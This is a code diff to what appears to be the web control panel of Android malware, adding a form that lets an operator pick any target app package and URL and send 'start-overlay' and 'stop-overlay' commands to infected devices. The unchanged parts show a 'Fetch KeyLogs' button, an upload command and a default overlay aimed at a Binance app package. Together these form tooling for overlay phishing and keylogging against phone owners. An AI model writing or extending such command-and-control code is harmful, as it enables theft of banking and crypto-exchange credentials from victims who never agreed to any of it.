@@ -69,6 +69,31 @@
   <button class="fetch" id="btnFetchKeyLog">Fetch KeyLogs</button>
   <button class="fetch" id="btnStartOverlay">Start Overlay</button>
   <button class="upload" id="btnUpload">Upload</button>
+  
+  <!-- Overlay Control Section -->
+<div style="margin-top: 20px; padding: 10px; background: #fff; border-radius: 8px; border: 1px solid #eee;">
+  <h3>Overlay Launcher</h3>
+  
+  <label>
+    Package Name:
+    <input id="pkgInput" type="text" placeholder="e.g. com.google.android.youtube" 
+           style="width: 300px; padding: 6px; margin-bottom: 6px;">
+  </label>
+  <br>
+  
+  <label>
+    URL:
+    <input id="urlInput" type="text" placeholder="e.g. https://google.com"
+           style="width: 300px; padding: 6px; margin-bottom: 6px;">
+  </label>
+  <br>
+  
+  <button class="fetch" id="btnCustomOverlay">Start Overlay (Custom)</button>
+  <button class="close" id="btnStopOverlay">Stop Overlay</button>
+</div>
+
+  
+  
   <button class="close" id="btnClose">Close</button>
 
   <pre id="log">Connecting...</pre>
@@ -124,6 +149,28 @@
     document.getElementById("btnStartOverlay").onclick = () => sendCmd("start-overlay{url:https://google.com,PackageName:com.binance.dev}");
     document.getElementById("btnUpload").onclick = () => sendCmd("upload");
     document.getElementById("btnClose").onclick = () => window.close();
+	
+	
+	
+	// ---- Custom Overlay Controls ----
+	document.getElementById("btnCustomOverlay").onclick = () => {
+	const pkg = document.getElementById("pkgInput").value.trim();
+	const url = document.getElementById("urlInput").value.trim();
+
+	if (!pkg || !url) {
+		pushLog("⚠️ Please enter both PackageName and URL");
+		return;
+	}
+
+	const cmd = `start-overlay{url:${url},PackageName:${pkg}}`;
+	sendCmd(cmd);
+	};
+
+	document.getElementById("btnStopOverlay").onclick = () => {
+	sendCmd("stop-overlay");
+	};
+
+
 
     // --- WebSocket for live updates ---
     const wsProto = location.protocol === "https:" ? "wss://" : "ws://";
